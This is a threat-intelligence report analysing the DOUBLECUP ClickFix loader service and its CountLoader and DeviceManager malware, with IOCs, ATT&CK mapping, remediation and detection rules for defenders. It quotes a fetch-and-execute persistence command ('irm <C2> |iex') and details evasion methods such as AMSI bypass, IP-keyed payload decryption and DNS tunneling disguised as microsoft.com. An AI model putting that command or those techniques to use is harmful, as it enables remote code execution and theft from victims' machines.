# Technical Analysis Report: DOUBLECUP ClickFix Loader-as-a-Service (2026-08-04)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-08-04
Version: 1.1 (FINAL)

## Executive Summary

DOUBLECUP is a Russian-operated Loader-as-a-Service (LaaS) platform active since early June 2026, providing licensed operators with infrastructure to conduct ClickFix social engineering attacks. The service embeds malicious code in PNG images using LSB steganography and leverages browser caching mechanisms to stage payloads, delivering two malware families: CountLoader (Windows and macOS) and a previously undocumented Python-based RAT called DeviceManager (Windows). The platform operates on a client-server model where the operator "Rognar" (aka @johnysilverhe) manages licensing through a Telegram bot (@harrypoterlohBOT) and a Go-based Windows campaign builder. The licensing panel was discovered at 213.139.77[.]109:9090 with an exposed open directory.

The infection chain employs environmental keying -- deriving the payload decryption key from the victim's public IPv4 address via PBKDF2 -- making offline sandbox analysis fail by design. CountLoader v4.5p introduces fileless PowerShell execution with .NET Reflection and D/Invoke for AMSI bypass, PE metadata header-patching of legitimate system binaries for process masquerading, and scheduled task persistence at 25-minute intervals. DeviceManager uses EtherHiding (Ethereum/Polygon smart contracts) for takedown-resistant C2 resolution, a custom DNS tunneling protocol that appends "microsoft.com" as a suffix to all queries to blend with legitimate traffic, and ChaCha20 encryption for payload delivery. Phishing pages impersonate CRM platforms including NetSuite, Odoo, HubSpot, and Salesforce. Prior Actioner coverage exists for ClickFix-based macOS attacks (2026-06-24); this report covers the new DOUBLECUP platform, CountLoader evolution, and the DeviceManager RAT.

## Background: ClickFix Social Engineering and Loader-as-a-Service

ClickFix is a social engineering technique where fake CAPTCHA or verification pages instruct victims to paste and execute commands in their system terminal. Originally targeting Windows, the technique expanded to macOS in late 2025. DOUBLECUP operationalizes ClickFix as a managed service: operators license the platform, build campaigns via a Go-based GUI tool, and embed DOUBLECUP's frontend code into phishing pages they host. The service handles steganographic PNG image hosting, session management, signal endpoints, encryption key provisioning, and automatic payload rebuilding. Customers are responsible only for creating and hosting the ClickFix-bearing websites.

The threat actor "Rognar" has a history of abusing legitimate platforms, including publishing a malicious VS Code extension named "Agent IDE" on the official marketplace under the publisher name "johnnysilverhe."

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| Early June 2026 | DOUBLECUP begins operating as a loader-as-a-service |
| 2026-08-03 | SOCRadar Threat Research Unit publishes technical analysis |
| 2026-08-04 | BleepingComputer and The Hacker News report on DOUBLECUP |

## Root Cause: ClickFix Social Engineering (User Execution)

Victims encounter fake CRM login pages impersonating NetSuite, Odoo, HubSpot, or Salesforce. Embedded iframes display fake CAPTCHA/verification prompts instructing the user to press Win+R and paste a command that was silently copied to the clipboard. The command uses `findstr` or `certutil` to locate and extract a steganographic PNG from the browser cache based on exact file size matching, then executes the hidden payload.

## Technical Analysis of the Malicious Payload

### 1. DOUBLECUP Frontend Injection and Session Management

When a victim visits a DOUBLECUP-equipped phishing page, the injected frontend code:

1. Generates a unique 16-character alphanumeric session ID
2. Issues a silent GET request to `/session/reg` to register the session
3. Fetches `/api/config` to retrieve the steganographic image URL, image size, session endpoint, and browser-specific commands
4. Forces background caching of the steganographic PNG image via an invisible element
5. Evaluates the browser User-Agent (Chrome, Edge, Firefox, Brave, Opera)
6. Copies a browser-matched extraction command to the clipboard
7. Displays ClickFix instructions
8. Polls `/session/check` at 1.2-3 second intervals for completion signal

The payload builder supports multiple chain languages (VBS, JScript, PowerShell, Batch, C#), steganography via LSB extraction, archive formats (ZIP, 7Z, RAR), and action types (MSHTA execution, EXE runs, archive extraction, custom commands).

### 2. Steganographic Payload Extraction and Environmental Keying

When the victim executes the clipboard command:

1. The command locates the cached PNG by exact file size (e.g., 304204 bytes) using `findstr` or `certutil`
2. Embedded code is extracted via LSB steganography or certutil-compatible methods
3. An obfuscated JScript/VBScript/PowerShell stage executes
4. The dropper retrieves the victim's public IPv4 address from `ip-api.com` or actor-controlled domains
5. The IP address is used as input to PBKDF2 key derivation
6. The final payload is decrypted using a custom SHA-256 stream cipher in Counter (CTR) mode with bitwise XOR
7. Payload integrity is verified against a hardcoded SHA-256 hash
8. XOR string deobfuscation uses a hardcoded key of 210 for Stage 2
9. The payload is reflectively loaded (.NET assemblies) or executed as PowerShell ScriptBlocks in-memory

Environmental keying ensures the payload cannot be decrypted in sandbox environments or by analysts on different networks.

### 3. C2 Infrastructure

**DOUBLECUP Infrastructure:**
- License panel: 213.139.77[.]109:9090 (open directory with testing files)
- DOUBLECUP servers: 80.96.109[.]229, 167.148.201[.]131, 89.124.117[.]12, 103.22.137[.]227, 146.70.124[.]154
- Payload builder / Telegram callback: 67.219.107[.]181 (hxxp://67.219.107[.]181/hgflssvslvidfugvbldiuv)
- DOUBLECUP server domains: srv641398444.host[.]ultaserver[.]net, nxtdrcliam[.]site

**CountLoader C2:**
- Windows: alphastore[.]vg
- macOS: appleid-customertelemetry[.]gl
- Communication: HTTP GET to `/connect` with XOR-encrypted telemetry (random 6-digit key, hex encoding), JWT Bearer token for authenticated subsequent requests

**DeviceManager C2:**
- Primary: 91.92.240[.]100
- EtherHiding: Ethereum/Polygon smart contracts resolve C2 dynamically
- Smart Contract: 0xc027490AF56a9d7050fc259Ecd03DA1580b84aae (Sepolia testnet)
- Ethereum Address: 0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8
- Transport: DNS tunneling (primary), HTTP POST (dormant module)

**Telegram C2:**
- Bot: @harrypoterlohBOT (managed by @johnysilverhe / "Rognar")

### 4. Platform-Specific Behavior

#### Windows -- CountLoader v4.5p

**Execution:** Fileless PowerShell with .NET Reflection and D/Invoke to bypass AMSI. Custom regex-based JSON parser avoids `ConvertFrom-Json` to evade EDR monitoring. Wildcard filename obfuscation (`pow?r?hell.exe`).

**Process Masquerading:** Copies system binaries (conhost.exe, powershell.exe, mshta.exe) to user-writable directories with identifying prefixes (c, p, m). Overwrites PE metadata fields (OriginalFilename, InternalName, FileDescription) with legitimate application names (e.g., "pOneDrive.exe" masquerading as OneDrive while being powershell.exe).

**Persistence:**
- Primary: Scheduled task `GoogleUpdateService{GUID}` -- downloads portable Python 3.13, drops embedded `App.py` for PE header patching; executes every 25 minutes with WakeToRun enabled
- Secondary: Scheduled task `MSEdgeUpdateService{GUID}` -- fallback using patched conhost.exe; command pattern: `"C:\Users\<User>\psvchost.exe" -ep bypass -c "irm <C2> |iex"`

**Reconnaissance:** Hardware profiling (processor ID, system UUID, disk model/serial), OS identification, antivirus enumeration, domain membership, cryptocurrency wallet detection across 45+ browsers, browser extension auditing for 48 wallet/security extension IDs (MetaMask, Phantom, Binance Chain Wallet, etc.), Signal Desktop detection.

**Command Dispatcher (11 types):** Download and execute, archive extraction and execution, DLL execution via rundll32, persistence cleanup, dynamic PowerShell module execution, silent MSI installation, USB worming via malicious .lnk shortcuts, MSHTA-proxied execution, PE-patching and advanced execution.

#### macOS -- CountLoader (Mach-O)

Cross-compiled from Windows (build path: `C:\Users\Administrator\source\repos\TestApp\Mac_C/main.c`). Targets both Intel (x86_64) and Apple Silicon (arm64/aarch64). Uses `popen()` and `system()` for subprocess execution (`/usr/bin/sw_vers`, `system_profiler SPHardwareDataType`, `/usr/bin/curl`). Persistence via LaunchAgent .plist files in `~/Library/LaunchAgents/`.

#### Windows -- DeviceManager RAT

**Delivery:** Delphi-compiled Inno Setup installer with encrypted payload overlay. Unpacker extracts temporary clone (is-DWA04JDXUI.tmp) and re-launches with IPC parameters (hexadecimal HWND, byte offset to encrypted overlay at ~10.2 MB, overlay size ~893 KB).

**Environment:** Extracts complete Python runtime (python3.dll, pythonw.exe, obfuscated run.pyw) into `Microsoft.PythonApp_yadfiy2x1ep12` directory.

**EtherHiding C2 Resolution:**
1. Builds endpoint hierarchy: cached RPCs -> configured RPCs -> fallback endpoints
2. Prepares `eth_call` JSON-RPC query with `get_data_selector` (0x1dcf296b) + `device_hash`
3. Device hash = first 16 chars of MD5(machine_guid + profile_guid + disk_id), padded to 64 chars for Solidity ABI compliance
4. Decryption via ChaCha20 using contract_address as nonce, iterating keys: device_hash, build_tag_token, global_key
5. First byte of plaintext indicates transport: 0x00 = HTTP POST, otherwise = DNS
6. Remaining bytes encode target IP/domain

**DNS Tunneling Protocol:**
- All queries append hardcoded apex domain "microsoft.com" to appear as legitimate traffic
- Check-in (A record): `{device_hash}{tag_short}.microsoft.com` -- first octet 0 = sleep, second = task count
- System info (TXT): `i-{device_hash}-{info_hex}.microsoft.com`
- Task polling (TXT): `t-{device_hash}-{process_id}.microsoft.com`
- Payload download (TXT): `{device_hash}-{task_id}-{chunk_num}.microsoft.com` -- Base64+ChaCha20 encrypted
- Command output (TXT): `{stream}-{device_hash}-{task_id}-{part}-{chunk}.microsoft.com`
- Status update (TXT): `r-{device_hash}-{task_id}-{status}-{exit_code}.microsoft.com`

**Command Execution:** Three interpreters (CMD, PowerShell, Python) in two modes (in-memory, on-disk). CMD pipes to `cmd.exe /Q /K`; PowerShell uses `-NoProfile -NonInteractive -NoLogo`; Python via `sys.executable`.

**Persistence:** Scheduled task `MicroUpdaterV1` executing pythonw.exe every 10 minutes. Task XML written to `%TEMP%\t.xml` then immediately deleted.

**Dormant Capabilities:** HTTP POST C2 module (hardcoded to DNS instead), WMI Event Subscription persistence using `root\subscription` namespace with 4-component binding (__IntervalTimerInstruction, __EventFilter, CommandLineEventConsumer, __FilterToConsumerBinding) via ctypes COM API interaction.

### 5. Anti-Forensics / Evasion Techniques

- **Environmental keying (T1480.001):** PBKDF2 key derivation from victim IP prevents sandbox detonation
- **Steganography (T1027.003):** LSB-embedded payloads in cached PNG images
- **Process masquerading (T1036.003):** PE header patching of legitimate system binaries
- **AMSI bypass:** .NET Reflection and D/Invoke in CountLoader v4.5p
- **Fileless execution:** In-memory .NET assembly loading and PowerShell ScriptBlocks
- **CIS locale detection:** DeviceManager self-deletes on CIS-language locale machines
- **Wake-Sleep-Die cycle:** 25-minute scheduled task intervals minimize behavioral detection window
- **Custom JSON parsing:** Regex-based parser avoids monitored `ConvertFrom-Json` cmdlet
- **Wildcard obfuscation:** `pow?r?hell.exe` to evade command-line string matching
- **XOR string obfuscation:** Hardcoded key 210 for Stage 2 payload strings
- **Mutex enforcement:** Host-unique mutex from MD5(Machine GUID + Disk ID)
- **Blockchain C2:** EtherHiding via Ethereum/Polygon smart contracts resists takedowns
- **DNS domain spoofing:** Appending "microsoft.com" to DNS tunneling queries
- **Temporary file deletion:** Task XML and temporary scripts deleted post-execution

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Windows | DOUBLECUP client | 882914f9014f14e89123e835f103ac8f9d4b2e358c1f21c1cbc7f1054e6afed6 | DOUBLECUP Go-based campaign builder |
| Windows | DOUBLECUP client variant | 8585721cbc46780903bd727e37a9ed07a33463852046ff65bc718ded4c80dfb1 | DOUBLECUP client alternate build |
| Windows | Steganographic PNG | 28cbbca8099bb1b27668d135314842c69ceb478a7d6b4b08f063d106a06c8f9d | Stage 2 steganographic PNG payload |
| Windows | MicroUpdaterV1.exe | 6e08cb5602f63bee2b40739167b4aef77763bc8fb47b4839ca2fc1607ad35cba | DeviceManager RAT executable |
| Windows | run.pyw | ea70895620f955b0712b85c3fee41de7437d5068267966f0b4fb6fa2704c3a50 | DeviceManager obfuscated Python script |
| Windows | CountLoader | bdf28e611d77362c40a0445655a35943c03accf21bb9a5af755da7eac5ea5e40 | CountLoader payload |
| macOS | setup.sh | afe273533d6f9d0b8852988f6a4b34571dd52af4c690e54723a86257aa8a015d | macOS CountLoader stager script |
| macOS | AppleIDVerificationService | 08730fda7366104b1461b12834f55723381bf34a234947689c708b1ee431af69 | macOS CountLoader binary |
| Windows | %LOCALAPPDATA%\DeviceManager\config.json | -- | DeviceManager configuration file |
| Windows | %LOCALAPPDATA%\DeviceManager\agent.log | -- | DeviceManager rotating log |
| Windows | %USERPROFILE%\App_{GUID}.py | -- | CountLoader masquerading PE helper |
| Windows | %TEMP%\_dm_task.py | -- | DeviceManager temporary task script |
| Windows | %TEMP%\t.xml | -- | DeviceManager scheduled task XML (deleted after creation) |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 213.139.77[.]109:9090 | DOUBLECUP license panel (open directory) |
| IP | 80.96.109[.]229 | DOUBLECUP actions |
| IP | 167.148.201[.]131 | DOUBLECUP actions |
| IP | 89.124.117[.]12 | DOUBLECUP actions |
| IP | 103.22.137[.]227 | DOUBLECUP server |
| IP | 67.219.107[.]181 | Payload builder / Telegram callback |
| IP | 146.70.124[.]154 | DOUBLECUP server |
| IP | 91.92.240[.]100 | DeviceManager RAT C2 |
| Domain | srv641398444.host[.]ultaserver[.]net | DOUBLECUP server |
| Domain | nxtdrcliam[.]site | DOUBLECUP server |
| Domain | canva-arts[.]com | Delivery infrastructure |
| Domain | cap-t1.spec-connectweb3[.]tv | Delivery infrastructure |
| Domain | cloud-electronic[.]com | Delivery infrastructure |
| Domain | cloudscraft[.]com | Delivery infrastructure |
| Domain | doublecap[.]ltd/live | Delivery infrastructure |
| Domain | examcanvas[.]com | Delivery infrastructure |
| Domain | storagepioneer[.]com | Delivery infrastructure |
| Domain | supercloudsaver[.]com | Delivery infrastructure |
| Domain | ticgo-cloud[.]com | Delivery infrastructure |
| Domain | roqqcloud[.]com | Delivery infrastructure |
| Domain | login-netsuite[.]com | Phishing (NetSuite impersonation) |
| Domain | login-odoo[.]com | Phishing (Odoo impersonation) |
| Domain | verification-salesforce[.]com | Phishing (Salesforce impersonation) |
| Domain | login-salesforce[.]com | Phishing (Salesforce impersonation) |
| Domain | login-hubspot[.]com | Phishing (HubSpot impersonation) |
| Domain | pending-verification[.]com | Phishing |
| Domain | alphastore[.]vg | CountLoader C2 (Windows) |
| Domain | appleid-customertelemetry[.]gl | CountLoader C2 (macOS) |
| URL | hxxp://67.219.107[.]181/hgflssvslvidfugvbldiuv | Telegram callback endpoint |
| Ethereum | 0xc027490AF56a9d7050fc259Ecd03DA1580b84aae | DeviceManager smart contract |
| Ethereum | 0xCE17b1EF00d47105Bc127BbE6fC45dE47BC22fb8 | DeviceManager Ethereum address |
| Telegram | @harrypoterlohBOT | Operator Telegram bot |

### Behavioral

- Scheduled tasks named `GoogleUpdateService{GUID}` or `MSEdgeUpdateService{GUID}` executing every 25 minutes with WakeToRun
- Scheduled task `MicroUpdaterV1` or `PythonAppUpdater` executing pythonw.exe every 10 minutes
- System binaries (conhost.exe, powershell.exe, mshta.exe) copied to `%USERPROFILE%` or `%APPDATA%` with single-letter prefixes (c, p, m)
- `findstr` or `certutil` accessing browser cache directories and searching for PNG files by file size
- High-volume DNS TXT queries with hex-prefixed subdomains under microsoft.com resolving to non-Microsoft infrastructure
- `eth_call` JSON-RPC traffic to public Ethereum/Polygon RPC endpoints from non-blockchain workloads
- LaunchAgent creation in `~/Library/LaunchAgents/` with `launchctl load` (macOS)

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1204.002 | User Execution: Malicious File | ClickFix lures trick users into pasting and executing clipboard commands |
| T1059.001 | PowerShell | CountLoader v4.5p fileless PowerShell execution with .NET Reflection |
| T1059.003 | Windows Command Shell | DeviceManager pipes commands to cmd.exe /Q /K |
| T1059.004 | Unix Shell | macOS CountLoader uses popen()/system() for subprocess execution |
| T1059.006 | Python | DeviceManager executes Python scripts in-memory and on-disk |
| T1053.005 | Scheduled Task | CountLoader (GoogleUpdateService/MSEdgeUpdateService), DeviceManager (MicroUpdaterV1) |
| T1547.009 | Shortcut Modification | CountLoader scans for browser .lnk files, USB worming via malicious shortcuts |
| T1091 | Replication Through Removable Media | CountLoader USB worming via malicious .lnk shortcuts on removable drives |
| T1546.003 | WMI Event Subscription | DeviceManager dormant capability using root\subscription |
| T1620 | Reflective Code Loading | In-memory .NET assembly loading via D/Invoke |
| T1027.003 | Steganography | Malicious code embedded in PNG images via LSB extraction |
| T1480.001 | Environmental Keying | PBKDF2 decryption key derived from victim's public IPv4 |
| T1140 | Deobfuscate/Decode Files | XOR deobfuscation (key 210), Base64/hex decoding stages |
| T1036.003 | Rename System Utilities | PE header patching of conhost.exe/powershell.exe/mshta.exe with prefixes |
| T1082 | System Information Discovery | Hardware profiling, OS identification, domain membership |
| T1518.001 | Security Software Discovery | Antivirus product enumeration, browser extension auditing |
| T1105 | Ingress Tool Transfer | Portable Python 3.13 download, secondary payload retrieval |
| T1102.001 | Dead Drop Resolver | EtherHiding via Ethereum/Polygon smart contracts for C2 resolution |
| T1071.004 | DNS | DNS tunneling with microsoft.com suffix for C2 communication |
| T1071.001 | Web Protocols | HTTP-based C2 with JWT-authenticated tasking |
| T1573.001 | Encrypted Channel: Symmetric | ChaCha20 and XOR encryption for C2 communications |
| T1001.003 | Protocol Impersonation | DNS queries spoofed as microsoft.com subdomains |

## Impact Assessment

DOUBLECUP represents a significant evolution in the ClickFix attack ecosystem, lowering the barrier to entry for financially motivated operators through its managed service model. The platform's environmental keying makes sandbox analysis ineffective, and its blockchain-based C2 infrastructure is resilient against traditional takedowns. The cross-platform capability (Windows and macOS) broadens the victim pool. The cryptocurrency wallet and browser extension auditing across 48 extension IDs indicates a strong financial theft motivation. The DeviceManager RAT's DNS tunneling protocol disguised as microsoft.com traffic is particularly concerning for defenders relying on domain reputation.

## Detection & Remediation

### Immediate Detection

```powershell
# Check for CountLoader scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskName -match "GoogleUpdateService\{|MSEdgeUpdateService\{|MicroUpdaterV1|PythonAppUpdater" }

# Check for DeviceManager installation directory
Test-Path "$env:LOCALAPPDATA\DeviceManager\config.json"

# Check for renamed system binaries in user directories
Get-ChildItem "$env:USERPROFILE" -Recurse -Filter "[cpm]*.exe" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^[cpm](conhost|powershell|mshta|svchost)\.exe$" }

# macOS: check for suspicious LaunchAgents
ls ~/Library/LaunchAgents/ | grep -v "com.apple"
```

### Remediation

1. **Containment:** Block all listed IOC IP addresses and domains at the network perimeter. Block Ethereum RPC endpoints from non-blockchain workloads.
2. **Eradication:** Remove identified scheduled tasks. Delete `%LOCALAPPDATA%\DeviceManager\` directory. Remove renamed system binaries from user directories. On macOS, unload and delete suspicious LaunchAgents.
3. **Recovery:** Rotate all credentials on compromised systems. Revoke any cryptocurrency wallet sessions. Reset browser sessions and tokens.
4. **Secret rotation:** Rotate all API keys, tokens, and passwords accessible from compromised endpoints. Monitor cryptocurrency wallets for unauthorized transactions.

### Long-Term Hardening

- Implement clipboard monitoring or restrictions to detect/prevent ClickFix-style paste-and-run attacks
- Block or alert on `findstr` and `certutil` accessing browser cache directories
- Monitor for `eth_call` traffic to public blockchain RPC endpoints from corporate networks
- Deploy DNS monitoring rules for high-entropy subdomains under microsoft.com resolving to non-Microsoft IP ranges
- Apple's macOS 26.4 reportedly introduces Terminal paste-based attack mitigations; verify availability in your deployment before relying on this control

## Detection Rules

These detections target DOUBLECUP-specific artifacts: CountLoader/DeviceManager persistence task names, browser cache steganographic extraction via findstr/certutil, process masquerading via renamed system binaries, DNS tunneling patterns, phishing domains, and known C2 infrastructure. PoC/advisory-specific altitude (default); compiles != fires -- verify in your pipeline. Four Snort rules and two Suricata session-endpoint rules were dropped during review due to generic URI patterns producing unacceptable false-positive rates.

### Sigma: CountLoader Persistence via Masqueraded Scheduled Task

Detects schtasks.exe creating tasks with the `GoogleUpdateService{` or `MSEdgeUpdateService{` naming pattern specific to CountLoader.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by proxy (MITRE ATT&CK data 403); sigma convert splunk 0, log_scale 0 — both exit 0. Task names with embedded GUID braces are highly distinctive; no legitimate Google/Edge update uses this format. -->
```yaml
title: CountLoader Persistence via Masqueraded Scheduled Task
id: 4a7b2e91-8c3f-4d5a-b6e1-9f0a2d3c4e5b
status: experimental
description: >
    Detects creation of scheduled tasks with naming patterns used by CountLoader
    (GoogleUpdateService or MSEdgeUpdateService followed by a GUID) for persistence
    with 25-minute execution intervals.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://www.bleepingcomputer.com/news/security/new-doublecup-clickfix-service-hides-malware-in-browser-cache-images/
author: Actioner
date: 2026/08/04
tags:
    - attack.t1053.005
    - attack.t1036.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - 'GoogleUpdateService{'
            - 'MSEdgeUpdateService{'
    condition: selection_schtasks
falsepositives:
    - Legitimate Google or Microsoft Edge update services (these use different task name formats without embedded GUIDs)
level: high
```

### Sigma: DeviceManager RAT Scheduled Task Creation

Detects schtasks.exe creating tasks named `MicroUpdaterV1` or `PythonAppUpdater`, specific to DeviceManager RAT persistence.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert splunk 0, log_scale 0. Task names are unique to DeviceManager; no known legitimate software uses these exact names. -->
```yaml
title: DeviceManager RAT Scheduled Task Creation
id: 5b8c3f02-9d4e-4a6b-c7f2-0e1b3d4c5a6f
status: experimental
description: >
    Detects creation of scheduled tasks named MicroUpdaterV1 or PythonAppUpdater
    used by the DeviceManager RAT for persistence via pythonw.exe execution.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://www.bleepingcomputer.com/news/security/new-doublecup-clickfix-service-hides-malware-in-browser-cache-images/
author: Actioner
date: 2026/08/04
tags:
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_task:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - 'MicroUpdaterV1'
            - 'PythonAppUpdater'
    condition: selection_task
falsepositives:
    - Unlikely; these task names are specific to DeviceManager RAT
level: high
```

### Sigma: DOUBLECUP Browser Cache PNG Extraction via Findstr or Certutil

Detects findstr.exe or certutil.exe searching browser cache directories for PNG files, consistent with DOUBLECUP steganographic payload extraction. This is a behavioral intersection pattern, not a DOUBLECUP-specific artifact; other steganographic loaders could match.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert splunk 0, log_scale 0. Behavioral intersection (cache dir + PNG + CLI tool) not unique to DOUBLECUP; downgraded from high to medium per review. Legitimate sysadmin cache inspection is a plausible FP source. -->
<!-- revision: confidence high->medium; added caveat re behavioral intersection, not campaign-specific. -->
```yaml
title: DOUBLECUP Browser Cache PNG Extraction via Findstr or Certutil
id: 6c9d4e13-ae5f-4b7c-d8e3-1f2c4e5d6b7a
status: experimental
description: >
    Detects use of findstr or certutil to search browser cache directories for PNG
    files, consistent with DOUBLECUP steganographic payload extraction from cached
    images.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
    - https://www.bleepingcomputer.com/news/security/new-doublecup-clickfix-service-hides-malware-in-browser-cache-images/
author: Actioner
date: 2026/08/04
tags:
    - attack.t1140
    - attack.t1027.003
logsource:
    category: process_creation
    product: windows
detection:
    selection_findstr:
        Image|endswith: '\findstr.exe'
        CommandLine|contains|all:
            - 'Cache'
            - '.png'
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains|all:
            - 'Cache'
            - '.png'
    condition: selection_findstr or selection_certutil
falsepositives:
    - System administrators searching browser cache for diagnostic purposes
level: medium
```

### Sigma: CountLoader Process Masquerading via Renamed System Binaries

Detects execution of system binaries with single-letter prefixes (c, p, m) from user-writable directories, matching CountLoader's PE header-patching masquerade technique.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma convert splunk 0, log_scale 0. Regex matches c/p/m prefixed binaries (conhost, powershell, mshta, svchost, OneDrive) in Users/AppData paths. The single-letter prefix + user-writable directory combination is distinctive. -->
```yaml
title: CountLoader Process Masquerading via Renamed System Binaries
id: 7d0e5f24-bf60-4c8d-e9f4-2a3d5f6e7c8b
status: experimental
description: >
    Detects execution of system binaries (conhost.exe, powershell.exe, mshta.exe)
    copied to user-writable directories with identifying prefixes (c, p, m) as
    used by CountLoader for process masquerading.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
author: Actioner
date: 2026/08/04
tags:
    - attack.t1036.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|re: '\\(c|p|m)(conhost|powershell|mshta|svchost|OneDrive)\.exe$'
        Image|contains:
            - '\Users\'
            - '\AppData\'
    condition: selection
falsepositives:
    - Custom application launchers with single-letter prefixed executables in user directories
level: high
```

### Sigma: DeviceManager RAT DNS Tunneling Check-in Pattern

Detects DNS queries matching DeviceManager's C2 pattern: a 16-character hex device hash prepended to microsoft.com, excluding legitimate Microsoft subdomains.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma convert splunk 0, log_scale 0. Regex anchored to 16 hex chars + alphanumeric suffix + microsoft.com. filter_legit is defense-in-depth boilerplate — the selection regex (^[a-f0-9]{16}...) cannot produce strings matching the filter's endswith patterns (e.g., .update.microsoft.com), so the filter is effectively dead code; kept for clarity if the selection is ever broadened. Medium confidence due to potential for legitimate hex-prefixed Microsoft CDN subdomains; pair with IOC correlation. Portability note: CrowdStrike DNS data may use different field names (DomainName vs QueryName); verify field mapping when deploying via sigma convert. -->
<!-- revision: documented dead filter_legit block; added CrowdStrike DNS portability note. -->
```yaml
title: DeviceManager RAT DNS Tunneling Check-in Pattern
id: 8e1f6a35-ca71-4d9e-f0a5-3b4e6a7f8d9c
status: experimental
description: >
    Detects DNS queries matching the DeviceManager RAT check-in pattern where
    device hash and tag are prepended to microsoft.com as a domain spoofing
    technique for C2 communication.
references:
    - https://socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/
author: Actioner
date: 2026/08/04
tags:
    - attack.t1071.004
    - attack.t1001.003
logsource:
    category: dns_query
detection:
    selection:
        QueryName|re: '^[a-f0-9]{16}[a-z0-9]+\.microsoft\.com$'
    filter_legit:
        QueryName|endswith:
            - '.update.microsoft.com'
            - '.windowsupdate.microsoft.com'
            - '.login.microsoft.com'
            - '.graph.microsoft.com'
    condition: selection and not filter_legit
falsepositives:
    - Legitimate Microsoft services with hex-prefixed subdomains (unlikely pattern)
level: medium
```

### Snort: Dropped

All four Snort rules were removed during review: `/session/reg` (generic REST endpoint), `/session/check` (generic polling pattern), `/api/config` (ubiquitous REST endpoint), and `/connect` + Bearer (standard auth API pattern). Each would produce high false-positive rates against normal web traffic.
<!-- revision: dropped 4 Snort rules (sid 2100101-2100104) — generic URI patterns, unacceptable FP rate. -->

### Suricata: DOUBLECUP and DeviceManager Network Indicators

Detects DeviceManager DNS tunneling to spoofed microsoft.com, known phishing domains, and DeviceManager C2 IP. Two session-endpoint rules (sid:2200101 `/session/reg`, sid:2200102 `/session/check`) were dropped during review -- same generic URI false-positive problem as the Snort rules.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0. All remaining rules are high confidence: DNS tunneling PCRE is specific (hex-prefix + microsoft.com), phishing domains are exact IOC match, C2 IP is matched in rule header. -->
<!-- revision: dropped sid:2200101, sid:2200102 (generic URI FP); fixed sid:2200107 — moved IP from content match to rule header for correct dest-IP matching; updated audit comment to remove stale medium-confidence reference. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DeviceManager RAT DNS Tunneling to Spoofed microsoft.com"; flow:to_server; dns.query; content:"microsoft.com"; endswith; fast_pattern; pcre:"/^[a-f0-9]{16}[a-z0-9]*\.microsoft\.com$/i"; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-04; sid:2200103; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - DOUBLECUP Phishing Domain login-netsuite"; flow:established,to_server; http.host; content:"login-netsuite.com"; fast_pattern; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-04; sid:2200104; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - DOUBLECUP Phishing Domain login-odoo"; flow:established,to_server; http.host; content:"login-odoo.com"; fast_pattern; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-04; sid:2200105; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - DOUBLECUP Phishing Domain verification-salesforce"; flow:established,to_server; http.host; content:"verification-salesforce.com"; fast_pattern; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-04; sid:2200106; rev:1;)

alert http $HOME_NET any -> [91.92.240.100] any (msg:"Actioner - DeviceManager C2 Server Communication"; flow:established,to_server; classtype:trojan-activity; reference:url,socradar.io/blog/doublecup-clickfix-loader-devicemanager-rats/; metadata:author Actioner, created_at 2026-08-04; sid:2200107; rev:2;)
```

### YARA: DeviceManager RAT and CountLoader File Detection

Detects DeviceManager RAT by EtherHiding function names, smart contract address, task names, and Python environment markers. Detects CountLoader by persistence task naming with GUID braces, PowerShell IRM/IEX invocation patterns, and wallet detection strings.
**Status:** compile ✅ compiles · confidence: high
- Malware_DeviceManager_RAT_DOUBLECUP: sample: synthetic ✓ (tested against constructed sample with published strings, not a real binary)
- Malware_CountLoader_DOUBLECUP: sample: untested (no real or synthetic sample available)
